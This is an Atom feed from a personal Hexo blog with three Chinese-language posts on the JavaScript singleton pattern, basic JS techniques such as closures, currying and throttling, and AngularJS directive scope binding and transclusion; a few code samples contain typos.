<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>My Little World</title>
  <subtitle>learn and share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoohannah.github.io/"/>
  <updated>2018-11-04T16:07:22.772Z</updated>
  <id>http://yoohannah.github.io/</id>
  
  <author>
    <name>YooHannah</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>单例模式</title>
    <link href="http://yoohannah.github.io/post/designMode/singleInstance.html"/>
    <id>http://yoohannah.github.io/post/designMode/singleInstance.html</id>
    <published>2018-11-04T15:11:09.000Z</published>
    <updated>2018-11-04T16:07:22.772Z</updated>
    
    <content type="html"><![CDATA[<p>单例模式定义：保证一个类仅有一个实例，并提供一个访问它的全局访问点</p>
<p>主要思想&lt;通用惰性单例&gt;<br>管理单例逻辑（保证实现单例的过程）和创建过程（具体业务逻辑）分开，创建过程函数作为参数给到管理单例逻辑函数中，<br>通过调用单例逻辑函数，业务逻辑函数只执行一次</p>
<p>用途<br>1.创建单一对象<br>2.利用业务逻辑仅执行一次，进行事件挂载</p>
<p>注意事项<br>业务逻辑函数一定要return 一个真正</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">var getSingle = function(fn)&#123;</div><div class="line"> 	var ret;</div><div class="line"> 	return function()&#123;</div><div class="line"> 		return ret || (ret = fn.apply(this,arguments));</div><div class="line"> 		//第一次执行时，会运行函数，返回创建的实例给到ret,</div><div class="line"> 		//以后再执行时，ret 即第一次创建的实例直接返回</div><div class="line"> 	&#125;</div><div class="line"> &#125;</div><div class="line"> </div><div class="line"> //返回单例</div><div class="line"> var creatObj = function(name)&#123;</div><div class="line"> 	this.aaaa = &#123;</div><div class="line">		name:name,</div><div class="line">		getName:function()&#123;console.log(this)&#125;</div><div class="line">	&#125;</div><div class="line">	return this </div><div class="line"> &#125;</div><div class="line">var creatObj1 = getSingle(creatObj)</div><div class="line">var obj = creatObj1(&apos;aaa&apos;)</div><div class="line">console.log(obj)  //返回window 对象(满足全局可访问)，带有aaaa属性，值为字面量对象</div><div class="line">obj.aaaa.getName()//&#123;name: &quot;kitty&quot;, getName: ƒ&#125;</div><div class="line"></div><div class="line">var obj1 = creatObj1(&apos;aaa&apos;)</div><div class="line">console.log(obj=== obj1) //true</div><div class="line"></div><div class="line">obj1.aaaa.getName() //&#123;name: &quot;kitty&quot;, getName: ƒ&#125;</div><div class="line"></div><div class="line">//事件仅挂载一次</div><div class="line"></div><div class="line">var bindEvent = getSingle(function()&#123;</div><div class="line">	document.getElementById(&apos;div1&apos;).onclick = function()&#123;</div><div class="line">		console.log(&apos;click&apos;)</div><div class="line">	&#125;</div><div class="line">	return true //保证只执行一次</div><div class="line">&#125;)</div><div class="line"></div><div class="line">var render = function()&#123;</div><div class="line">	console.log(&apos;开始渲染&apos;)；</div><div class="line">	bindEvent()</div><div class="line">&#125;</div><div class="line"></div><div class="line">render()</div><div class="line">render()</div><div class="line">render()</div><div class="line">//渲染多次，div1只挂载一次事件</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单例模式定义：保证一个类仅有一个实例，并提供一个访问它的全局访问点&lt;/p&gt;
&lt;p&gt;主要思想&amp;lt;通用惰性单例&amp;gt;&lt;br&gt;管理单例逻辑（保证实现单例的过程）和创建过程（具体业务逻辑）分开，创建过程函数作为参数给到管理单例逻辑函数中，&lt;br&gt;通过调用单例逻辑函数，业务逻辑
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>基础知识</title>
    <link href="http://yoohannah.github.io/post/designMode/basic.html"/>
    <id>http://yoohannah.github.io/post/designMode/basic.html</id>
    <published>2018-11-02T23:37:09.000Z</published>
    <updated>2018-11-03T15:22:22.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些有思想提醒作用的话"><a href="#一些有思想提醒作用的话" class="headerlink" title="一些有思想提醒作用的话"></a>一些有思想提醒作用的话</h1><p>把不变的部分隔离出来，把可变的部分封装起来</p>
<p>多态最根本的作用就是通过把过程化的条件分支语句转化为对象的多态性，从而消除这些条件分支语句</p>
<p>（每个对象应该做什么，已成为了该对象的一个方法，被安装在对象的内部，每个对象负责它们自己的行为，所以这些对象可以根据同一个消息，有条不紊的分贝进行各自的工作  ====&gt; 将行为分布在各个对象中，并让对象各自负责自己的行为&lt;—面向对象设计优点）</p>
<p>对象以方法的形式包含了过程，而闭包则是在过程中以环境的形式包含了数据</p>
<h1 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h1><p>1.原型继承过程：对象把请求委托给它的构造器的原型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">var A = function()&#123;&#125;;</div><div class="line">A.prototype = &#123;name:&apos;seven&apos;&#125;;</div><div class="line">var B = function()&#123;&#125;;</div><div class="line">B.color=&apos;red&apos;;</div><div class="line">B.prototype = new A();</div><div class="line">B.prototype.color = &apos;green&apos;</div><div class="line">var b = new B();</div><div class="line">console.log(b.name,b.color)</div><div class="line"></div><div class="line">//seven green</div></pre></td></tr></table></figure>
<p>2.用new 调用构造器时，如果构造器显示返回了一个object类型的对象，那么此次运算结果最终会返回这个对象，而不是this；<br>  若不显示返回任何数据，或者是返回一个非对象类型的数据，则会正常返回this</p>
<p>3.使用Dom 方法时，注意是否会造成this 丢失<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	let getId = document.getElementById; //原来 getElementById this指向document</div><div class="line">	getId(&apos;DIV1&apos;) //现在指向window</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>4.使用call/apply时，如果第一个参数传入null，那么函数体内的this会指向window</p>
<p>5.闭包作用：封装变量；延续局部变量寿命<br> 闭包和内存泄露有关系的地方是，使用闭包的同时比较容易形成循环引用，如果闭包的作用域链中保存着一些DOM节点，就比较可能造成内存泄露。因为IE浏览器中，由于BOM和DOM对象是使用C++以COM对象的方式实现的，而COM对象的垃圾收集机制采用引用计数策略，这时，如果两个对象之间形成了循环引用，那么这两个对象都无法被回收。</p>
<p> 解决办法是将循环引用中的变量设为null，方便回收。</p>
<h1 id="高阶函数一些例子"><a href="#高阶函数一些例子" class="headerlink" title="高阶函数一些例子"></a>高阶函数一些例子</h1><h2 id="一个单例模式"><a href="#一个单例模式" class="headerlink" title="一个单例模式"></a>一个单例模式</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var getSingle = function(fn)&#123;</div><div class="line">	var ret;</div><div class="line">	return function()&#123;</div><div class="line">		return ret || (ret = fn.apply(this,arguments));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="AOP（切面编程）-实现"><a href="#AOP（切面编程）-实现" class="headerlink" title="AOP（切面编程） 实现"></a>AOP（切面编程） 实现</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"> Function.prototype.before = function(beforeFn)&#123;</div><div class="line">	return ()=&gt;&#123;</div><div class="line">		beforeFn.apply(this,arguments);</div><div class="line">		return this.apply(this,arguments);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">Function.prototype.after = function(afterFn)&#123;</div><div class="line">	return ()=&gt;&#123;</div><div class="line">		this.apply(this,arguments);</div><div class="line">		afterFn.apply(this,arguments);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">var func = function ()&#123;console.log(2)&#125;</div><div class="line">func = func.before(()=&gt;&#123;console.log(1)&#125;).after(()=&gt;&#123;console.log(3)&#125;)</div><div class="line">func()</div><div class="line">//1</div><div class="line">//2</div><div class="line">//3</div></pre></td></tr></table></figure>
<h2 id="部分求值-currying"><a href="#部分求值-currying" class="headerlink" title="部分求值 currying"></a>部分求值 currying</h2><p> 一个curring的函数首先会接受一些参数，接受了这些参数之后，该函数并不会立即求值，而是继续返回另外一个函数，刚才传入的参数在函数形成的闭包中被保存起来，待到函数被真正需要求值的时候，之前传入的所有参数都会被一次性用于求值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"> var currying = function(fn)&#123;</div><div class="line">	let args = [];</div><div class="line">	return function()&#123;</div><div class="line">		if(arguments.length === 0)&#123;</div><div class="line">			return fn.apply(this,args);</div><div class="line">		&#125;else&#123;</div><div class="line">			[].push.apply(args,arguments);</div><div class="line">			return arguments.callee;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">var cost = (function()&#123;</div><div class="line">	var money = 0;</div><div class="line">	return function ()&#123;</div><div class="line">		for(var i = 0,l=arguments.length;i&lt;l;i++)&#123;</div><div class="line">			money += arguments[i];</div><div class="line">		&#125;</div><div class="line">		return money;</div><div class="line">	&#125;</div><div class="line">&#125;)();</div><div class="line"></div><div class="line">var cost = currying(cost);</div><div class="line">cost(100);</div><div class="line">console.log(cost(200))</div><div class="line">console.log(cost())</div></pre></td></tr></table></figure>
<h2 id="函数节流"><a href="#函数节流" class="headerlink" title="函数节流"></a>函数节流</h2><p>多次重复调用，按时间限制调用次数<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">var throttle = function(fn,interval)&#123;</div><div class="line">	var _self = fn,timer,firstTime = true;</div><div class="line">	return fucntion()&#123;</div><div class="line">		var args = arguments,_me = this;</div><div class="line">		if(fiestTime)&#123;</div><div class="line">			_self.apply(_me,args);</div><div class="line">			return firstTime = false;</div><div class="line">		&#125;</div><div class="line">		if(timer)&#123;</div><div class="line">			return false;</div><div class="line">		&#125;</div><div class="line">		timer = setTimeout(function()&#123;</div><div class="line">			clearTimeout(timer);</div><div class="line">			timer = null;</div><div class="line">			_self.apply(_me,args);</div><div class="line">		&#125;,interval||500)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="分时函数"><a href="#分时函数" class="headerlink" title="分时函数"></a>分时函数</h2><p>大批量数据要执行同一函数，分批次执行任务<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"> var timeChunk = function(ary,fn,count)&#123;</div><div class="line">	var obj,t;</div><div class="line">	var len = ary.length;</div><div class="line">	var start = function()&#123;</div><div class="line">		for(var i = 0;i&lt;Math.min(count||1,ary.length);i++)&#123;</div><div class="line">			var obj = ary.shift();</div><div class="line">			fn(obj);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return function()&#123;</div><div class="line">		t=setInterval(function()&#123;</div><div class="line">			if(ary.length === 0)&#123;</div><div class="line">				return clearInterval(t)</div><div class="line">			&#125;</div><div class="line">			start();</div><div class="line">		&#125;,200)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="惰性加载函数"><a href="#惰性加载函数" class="headerlink" title="惰性加载函数"></a>惰性加载函数</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"> var addEvent = function(elem,type,handler)&#123;</div><div class="line">	if(window.addEventListener)&#123;</div><div class="line">		addEvent = function(elem,type,handler)&#123;</div><div class="line">			elem.addEventListerner(type,handler,false)</div><div class="line">		&#125;</div><div class="line">	&#125;else if(window.attachEvent)&#123;</div><div class="line">		addEvent = function(elem,type,handler)&#123;</div><div class="line">			elem.attachEvent(&apos;on&apos;+type,handler)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	addEvent(elem,type,handler);</div><div class="line">&#125;</div><div class="line">//addEvent 在第一次进入条件分支之后，在函数内部会重写这个函数，重写之后的函数就是我们期望的函数，在下一次进入addEvent</div><div class="line">//函数时，addEvent函数不存在条件分支，无需再进行判断</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一些有思想提醒作用的话&quot;&gt;&lt;a href=&quot;#一些有思想提醒作用的话&quot; class=&quot;headerlink&quot; title=&quot;一些有思想提醒作用的话&quot;&gt;&lt;/a&gt;一些有思想提醒作用的话&lt;/h1&gt;&lt;p&gt;把不变的部分隔离出来，把可变的部分封装起来&lt;/p&gt;
&lt;p&gt;多态最根本
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>angularjs directive编写组件小结</title>
    <link href="http://yoohannah.github.io/post/knowledge/angularjsdirective.html"/>
    <id>http://yoohannah.github.io/post/knowledge/angularjsdirective.html</id>
    <published>2018-08-29T23:37:09.000Z</published>
    <updated>2018-08-30T00:00:07.441Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;edit-modal dismiss=&quot;dismiss()&quot; config=&quot;model.config&quot; after-save=&quot;model.afterSave()&quot; aaa=&quot;model.hello&quot;&gt;&lt;/edit-modal&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">export function editModalDirective() &#123;</div><div class="line">  return &#123;</div><div class="line">    restrict: &apos;E&apos;,</div><div class="line">    template: template,</div><div class="line">    controller: EditModalCtrl,</div><div class="line">    bindToController: true,</div><div class="line">    controllerAs: &apos;ctrl&apos;,</div><div class="line">    transclude: true,</div><div class="line">    scope: &#123;</div><div class="line">      dismiss: &apos;&amp;&apos;,</div><div class="line">      afterSave: &apos;&amp;&apos;,</div><div class="line">      config: &apos;=&apos;,</div><div class="line">    &#125;,</div><div class="line">    link: function(scope, ele, attrs) &#123;</div><div class="line">      if (scope.ctrl.config.type === &apos;Strategy&apos;) &#123;</div><div class="line">        if (scope.ctrl.config.type === &apos;Strategy&apos;) &#123;</div><div class="line">          ele[0].className += &apos;strategy&apos;;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      </div><div class="line">      </div><div class="line">    &#125;,</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line">//在模块编译时注册指令</div><div class="line">coreModule.directive(&apos;editModal&apos;, editModalDirective);</div><div class="line">//参考：https://www.cnblogs.com/wangnuo/p/6305742.html</div></pre></td></tr></table></figure>
<h2 id="link函数"><a href="#link函数" class="headerlink" title="link函数"></a>link函数</h2><p>link函数仅在编译时执行一次，三个参数：scope, ele, attrs</p>
<h3 id="ele"><a href="#ele" class="headerlink" title="ele"></a>ele</h3><p>即是当前的指令DOM对象，因此可以在ele上绑定触发事件,</p>
<p>但谨慎在数据上利用事件订阅触发机制进行事件绑定，</p>
<p>因为如果在外层包react组件的情况下，可能会导致数据刷新，但没有事件绑定，从而无法触发事件</p>
<p>注意在获取深层子dom时可能会获取不到</p>
<h3 id="attrs"><a href="#attrs" class="headerlink" title="attrs"></a>attrs</h3><p>指ele所在dom上的属性集合,没有在scope属性中声明的属性也能看到</p>
<p>但要注意，属性值就是标签上变量的名，不是标签上变量指代的值</p>
<p>标签上属性赋值变量的值在参数scope中<br><img src="/image/attrs.png" alt="attrs"></p>
<h3 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h3><p>link函数参数scope指向当前指令的作用域</p>
<p>参数scope的ctrl属性（controllerAs属性的值）即EditModalCtrl</p>
<p>因为这里配置了controller，bindToController，controllerAs，</p>
<p>所以在scope属性中声明的属性(config)方法（dismiss,after）会被归并到controller中，会以ctrl的属性形式出现，</p>
<p>即如果我想拿到属性scope中声明的config,可以这样：scope.ctrl.config</p>
<p>同时可以在EditModalCtrl中访问获取config,即this.config</p>
<p>另外如果没有在属性scope中声明的属性aaa，但在标签中进行了配置（aaa=”model.hello”），是无效的,ctrl上是不会有aaa属性的，即传递不进来</p>
<p>因此可以在link函数中拿到父作用域传递过来的值，分情况进行不同处理<br><img src="/image/scope.png" alt="scope"></p>
<h2 id="scope属性"><a href="#scope属性" class="headerlink" title="scope属性"></a>scope属性</h2><p>建立子域，声明所在标签的属性名，以及传值方式,controler存在情况下被合并</p>
<h3 id=""><a href="#" class="headerlink" title="@"></a>@</h3><p>@ 在 directive 中使用 xxx 属性绑定父 scope 中的属性。当改变父 scope 中属性的值的时候，directive 会同步更新值，当改变 directive 的 scope 的属性值时，父 scope 无法同步更新值。使用&#123;&#123;&#125;&#125;引用绑定值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">app.controller(&quot;myController&quot;, function ($scope) &#123;</div><div class="line">        $scope.name = &quot;hello world&quot;;</div><div class="line">    &#125;).directive(&quot;isolatedDirective&quot;, function () &#123;</div><div class="line">        return &#123;</div><div class="line">            scope: &#123;</div><div class="line">                name: &quot;@&quot;</div><div class="line">            &#125;,</div><div class="line">            template: &apos;Say：&#123;&#123;name&#125;&#125; &lt;br&gt;改变隔离scope的name：&lt;input type=&quot;buttom&quot; value=&quot;&quot; ng-model=&quot;name&quot; class=&quot;ng-pristine ng-valid&quot;&gt;&apos;</div><div class="line">        &#125;</div><div class="line">&#125;)</div><div class="line"></div><div class="line"></div><div class="line">&lt;div ng-controller=&quot;myController&quot;&gt;</div><div class="line">   &lt;div class=&quot;result&quot;&gt;</div><div class="line">       &lt;div&gt;父scope：</div><div class="line">           &lt;div&gt;Say：&#123;&#123;name&#125;&#125;&lt;br&gt;改变父scope的name：&lt;input type=&quot;text&quot; value=&quot;&quot; ng-model=&quot;name&quot;/&gt;&lt;/div&gt;</div><div class="line">       &lt;/div&gt;</div><div class="line">       &lt;div&gt;隔离scope：</div><div class="line">           &lt;div isolated-directive name=&quot;&#123;&#123;name&#125;&#125;&quot;&gt;&lt;/div&gt;</div><div class="line">       &lt;/div&gt;</div><div class="line">        &lt;div&gt;隔离scope（不使用&#123;&#123;name&#125;&#125;）：</div><div class="line">             &lt;div isolated-directive name=&quot;name&quot;&gt;&lt;/div&gt;</div><div class="line">         &lt;/div&gt;</div><div class="line">   &lt;/div&gt;</div></pre></td></tr></table></figure></p>
<h3 id="-1"><a href="#-1" class="headerlink" title="="></a>=</h3><p>= 无论是改变父 scope 还是隔离 scope 里的属性，父 scope 和隔离 scope 都会同时更新属性值，因为它们是双向绑定的关系,使用“”引用绑定值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">app.controller(&quot;myController&quot;, function ($scope) &#123;</div><div class="line">        $scope.user = &#123;</div><div class="line">            name: &apos;hello&apos;,</div><div class="line">            id: 1</div><div class="line">        &#125;;</div><div class="line">    &#125;).directive(&quot;isolatedDirective&quot;, function () &#123;</div><div class="line">        return &#123;</div><div class="line">            scope: &#123;</div><div class="line">                user: &quot;=&quot;</div><div class="line">            &#125;,</div><div class="line">            template: &apos;Say：&#123;&#123;user.name&#125;&#125; &lt;br&gt;改变隔离scope的name：&lt;input type=&quot;buttom&quot; value=&quot;&quot; ng-model=&quot;user.name&quot;/&gt;&apos;</div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line"></div><div class="line">&lt;div ng-controller=&quot;myController&quot;&gt;</div><div class="line">    &lt;div&gt;父scope：</div><div class="line">        &lt;div&gt;Say：&#123;&#123;user.name&#125;&#125;&lt;br&gt;改变父scope的name：&lt;input type=&quot;text&quot; value=&quot;&quot; ng-model=&quot;user.name&quot;/&gt;&lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div&gt;隔离scope：</div><div class="line">        &lt;div isolated-directive user=&quot;user&quot;&gt;&lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div&gt;隔离scope（使用&#123;&#123;name&#125;&#125;）：</div><div class="line">        &lt;div isolated-directive user=&quot;&#123;&#123;user&#125;&#125;&quot;&gt;&lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp; 用来绑定函数，在directive中调用父域中的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"> app.controller(&quot;myController&quot;, function ($scope) &#123;</div><div class="line">        $scope.value = &quot;hello world&quot;;</div><div class="line">        $scope.click = function () &#123;</div><div class="line">            $scope.value = Math.random();</div><div class="line">        &#125;;</div><div class="line">    &#125;).directive(&quot;isolatedDirective&quot;, function () &#123;</div><div class="line">        return &#123;</div><div class="line">            scope: &#123;</div><div class="line">                action: &quot;&amp;&quot;</div><div class="line">            &#125;,</div><div class="line">            template: &apos;&lt;input type=&quot;button&quot; value=&quot;在directive中执行父scope定义的方法&quot; ng-click=&quot;action()&quot;/&gt;&apos;</div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line">    </div><div class="line">    </div><div class="line">    &lt;div  ng-controller=&quot;myController&quot;&gt;</div><div class="line">        &lt;div&gt;父scope：</div><div class="line">            &lt;div&gt;Say：&#123;&#123;value&#125;&#125;&lt;/div&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;隔离scope：</div><div class="line">            &lt;div isolated-directive action=&quot;click()&quot;&gt;&lt;/div&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>参考： <a href="https://blog.coding.net/blog/angularjs-directive-isolate-scope?type=early" target="_blank" rel="external">https://blog.coding.net/blog/angularjs-directive-isolate-scope?type=early</a></p>
<h2 id="transclude"><a href="#transclude" class="headerlink" title="transclude"></a>transclude</h2><p>类似于VUE的slot,但不如slot的灵活强，更倾向于定制插入，在固定位置插入</p>
<h3 id="单点嵌入"><a href="#单点嵌入" class="headerlink" title="单点嵌入"></a>单点嵌入</h3><p>设置属性 transclude:true</p>
<p>在模板中将 &lt;ng-transclude&gt;&lt;/ng-transclude&gt;放到要插入的位置</p>
<p>应用时&lt;my-labe&gt;&lt;span&gt;1233&lt;/span&gt;&lt;/my-label&gt;;</p>
<p>&lt;span&gt;1233&lt;/span&gt; 会自动插入&lt;ng-transclude&gt;&lt;/ng-transclude&gt;之间</p>
<h3 id="多点嵌入"><a href="#多点嵌入" class="headerlink" title="多点嵌入"></a>多点嵌入</h3><p>设置属性 transclude ：{模板中flag:页面应用时标签名的驼峰式，}</p>
<p>在模板中制定位置放置flag :&lt;div  ng-transclude=”flag”&gt;&lt;/div&gt;</p>
<p>应用时 &lt;my-label&gt;&lt;my-title&gt;123&lt;/my-title&gt;&lt;/my-label&gt;</p>
<p>123 会自动插入&lt;div  ng-transclude=”flag”&gt;&lt;/div&gt;之间</p>
<p>参考：<a href="https://segmentfault.com/a/1190000004586636" target="_blank" rel="external">https://segmentfault.com/a/1190000004586636</a></p>
<h3 id="scope绑定"><a href="#scope绑定" class="headerlink" title="scope绑定"></a>scope绑定</h3><p>使用transcludeFn给transclude进来的Dom手动制定scope,</p>
<p>transcludeFn可来自compile，link的参数，或者controller的注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">.directive(&quot;todo&quot;, function()&#123;</div><div class="line"></div><div class="line">    return &#123;</div><div class="line">        restrict:&quot;E&quot;,</div><div class="line">        transclude:&quot;true&quot;,</div><div class="line">        template:&quot;&lt;header&gt;&#123;&#123;header&#125;&#125;&lt;/header&gt;&lt;div&gt;&lt;span&gt;这里是自定义区域&lt;/span&gt;&lt;content-transclude&gt;&lt;/content-transclude&gt;&lt;/div&gt;&quot;</div><div class="line">        scope:&#123;</div><div class="line">            header:&quot;@&quot;</div><div class="line">        &#125;,</div><div class="line">        controller:[&quot;$transclude&quot;,function(transcludeFn)&#123;</div><div class="line">            this.transcludeFn = transcludeFn;</div><div class="line">        &#125;]</div><div class="line">    &#125;;</div><div class="line">&#125;)</div><div class="line"></div><div class="line">.directive(&quot;contentTransclude&quot;,funtion()&#123;</div><div class="line">    return &#123;</div><div class="line">        restrict:&quot;E&quot;,</div><div class="line">        require:&quot;^todo&quot;,</div><div class="line">        link:function(scope,element,attr,todoController)&#123;</div><div class="line">            todoController.transcludeFn(scope.$parent, function(transcludeContent)&#123;</div><div class="line">                element.append(transcludeContent);</div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>参考：<a href="https://blog.csdn.net/shut1k/article/details/49848637" target="_blank" rel="external">https://blog.csdn.net/shut1k/article/details/49848637</a></p>
]]></content>
    
    <summary type="html">
    
